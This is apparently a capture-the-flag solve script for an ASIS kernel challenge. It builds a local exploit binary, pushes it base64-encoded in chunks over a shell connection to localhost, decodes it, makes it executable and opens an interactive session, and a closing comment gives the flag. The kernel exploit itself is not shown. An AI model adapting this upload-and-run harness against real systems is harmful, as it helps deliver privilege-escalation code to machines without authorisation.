import base64

from ptrlib import *


def run(cmd):
    r.sendlineafter("$ ", cmd)
    r.recvline()
    return


os.system("make")
with open("exploit", "rb") as f:
    payload = bytes2str(base64.b64encode(f.read()))

r = Socket("localhost", 9003)

r.recv()

run('cd /tmp')
logger.info("[+] Uploading...")
for i in range(0, len(payload), 512):
    run('echo "{}" >> b64solve'.format(payload[i:i + 512]))
run('base64 -d b64solve > solve')
run('rm b64solve')
run('chmod +x solve')

r.interactive()

# FLAG --> ASIS{0ff-by-nu11_is_5ti11_us3fu1_0n_k3rn3l_l4nd}
